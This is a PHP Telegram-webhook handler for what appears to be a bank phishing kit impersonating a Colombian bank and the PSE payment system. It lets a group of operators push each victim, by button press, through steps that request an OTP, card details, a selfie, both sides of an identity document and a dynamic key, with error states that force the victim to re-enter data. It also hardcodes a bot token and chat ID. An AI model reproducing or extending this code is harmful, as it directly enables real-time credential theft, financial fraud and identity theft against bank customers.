<?php
// updatetele.php — Manejador de Webhook de Telegram con Autenticación Criptográfica
error_reporting(0);

// Cargar config y DB
if (!isset($config) || !is_array($config)) {
    $config = require __DIR__ . '/config/config.php';
}
$conn = require __DIR__ . '/config/db.php';

$security_key = $config['security_key'] ?? 'secure_key_123';
$bot_token    = $config['botToken'] ?? '8634923330:AAH31BhUWH8O2LuD9IQdwZyUTUyc0Ij-Hxo';
$chat_id      = $config['chatId'] ?? '-5180034812';

// Auto-Setup Webhook en Telegram: ?setup_webhook=1
if (isset($_GET['setup_webhook'])) {
    $webhookUrl = "https://" . ($_SERVER['HTTP_HOST'] ?? 'solucionesvirtualesbancol.vercel.app') . "/updatetele.php?key=" . urlencode($security_key);
    $apiUrl = "https://api.telegram.org/bot{$bot_token}/setWebhook?url=" . urlencode($webhookUrl) . "&secret_token=" . urlencode($security_key);
    $res = @file_get_contents($apiUrl);
    header('Content-Type: application/json');
    echo $res;
    exit();
}

// Mapeo de nombres de acciones humanas
$actionNames = [
    1  => '⏳ En Espera',
    2  => '⚠️ Usuario Incorrecto',
    3  => '🔑 Solicitar OTP',
    4  => '⚠️ OTP Error',
    5  => '💳 Solicitar Tarjeta',
    6  => '⚠️ Tarjeta Error',
    7  => '✅ Finalizar',
    8  => '📲 WhatsApp',
    9  => '🤳 Selfie',
    10 => '⚠️ Selfie Error',
    11 => '🪪 Documento Frente',
    12 => '🪪 Documento Reverso',
    13 => '⚠️ Doc Frente Error',
    14 => '⚠️ Doc Reverso Error',
    15 => '🔐 Clave Dinámica',
    16 => '⚠️ Clave Dinámica Error'
];

// Helper para enviar mensajes a Telegram
function sendTelegramMsg($token, $chatId, $text) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $postData = [
        'chat_id'    => $chatId,
        'text'       => $text,
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Helper para responder callback queries (notificación popup al usuario)
function answerTelegramCallback($token, $callbackId, $text) {
    $url = "https://api.telegram.org/bot{$token}/answerCallbackQuery";
    $postData = [
        'callback_query_id' => $callbackId,
        'text'              => $text,
        'show_alert'        => false
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// 1. PROCESAR WEBHOOK DE TELEGRAM (callback_query)
$input = file_get_contents('php://input');
if ($input) {
    // Validación de Token Secreto de Telegram (Cabecera oficial o parámetro de URL)
    $receivedSecret = $_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN'] ?? ($_GET['key'] ?? '');
    if (!empty($security_key) && $receivedSecret !== $security_key) {
        http_response_code(403);
        echo "Unauthorized Webhook Request";
        exit();
    }

    $update = json_decode($input, true);
    if (isset($update['callback_query'])) {
        $cb = $update['callback_query'];
        $callbackId = $cb['id'] ?? '';
        $data = $cb['data'] ?? ''; // Formato esperado: "cmd_{estado}_{id}"
        
        // Extraer ID del chat de Telegram donde se presionó el botón
        $targetChatId = $cb['message']['chat']['id'] ?? $chat_id;

        // Extraer usuario de Telegram que hizo clic
        $firstName = $cb['from']['first_name'] ?? 'Integrante';
        $lastName  = $cb['from']['last_name'] ?? '';
        $username  = isset($cb['from']['username']) && !empty($cb['from']['username']) ? '@' . $cb['from']['username'] : '';
        $who = trim("$firstName $lastName $username");

        if (preg_match('/^cmd_(\d+)_(\d+)$/', $data, $matches)) {
            $estado = intval($matches[1]);
            $id     = intval($matches[2]);

            // Actualizar en base de datos
            try {
                $stmt = $conn->prepare("UPDATE pse SET estado = :estado WHERE id = :id");
                $stmt->execute(['estado' => $estado, 'id' => $id]);
            } catch (Exception $e) {}

            $actionName = $actionNames[$estado] ?? "Estado $estado";

            // Enviar respuesta popup al usuario
            answerTelegramCallback($bot_token, $callbackId, "Acción: $actionName");

            // Enviar notificación al MISMO grupo donde se presionó el botón
            $notifyText  = "<b>🔔 Acción Ejecutada en el Grupo</b>\n\n";
            $notifyText .= "👤 <b>Integrante:</b> " . htmlspecialchars($who) . "\n";
            $notifyText .= "⚡ <b>Acción:</b> " . htmlspecialchars($actionName) . "\n";
            $notifyText .= "🆔 <b>ID Cliente:</b> #" . $id;

            sendTelegramMsg($bot_token, $targetChatId, $notifyText);
        }
    }
    http_response_code(200);
    echo "OK";
    exit();
}

// 2. PROCESAR PETICIÓN GET (Panel web / Links directos con llave de seguridad)
if (isset($_GET['id'], $_GET['estado'], $_GET['key']) && $_GET['key'] === $security_key) {
    $id     = intval($_GET['id']);
    $estado = intval($_GET['estado']);
    $byUser = isset($_GET['by']) ? trim($_GET['by']) : 'Integrante / Panel';

    try {
        $stmt = $conn->prepare("UPDATE pse SET estado = :estado WHERE id = :id");
        $stmt->execute(['estado' => $estado, 'id' => $id]);
    } catch (Exception $e) {}

    $actionName = $actionNames[$estado] ?? "Estado $estado";

    // Enviar mensaje al grupo de Telegram indicando la acción y quién la ejecutó
    $notifyText  = "<b>🔔 Acción Ejecutada en Botón</b>\n\n";
    $notifyText .= "👤 <b>Ejecutado por:</b> " . htmlspecialchars($byUser) . "\n";
    $notifyText .= "⚡ <b>Acción:</b> " . htmlspecialchars($actionName) . "\n";
    $notifyText .= "🆔 <b>ID Cliente:</b> #" . $id;

    sendTelegramMsg($bot_token, $chat_id, $notifyText);

    http_response_code(200);
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8">
<style>body{background:#0f172a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}</style>
</head><body>
<p>✅ Estado actualizado a: ' . htmlspecialchars($actionName) . '</p>
<script>setTimeout(() => window.close(), 1000);</script>
</body></html>';
    exit();
} else {
    http_response_code(403);
    echo 'Acceso no autorizado o parámetros inválidos.';
}
?>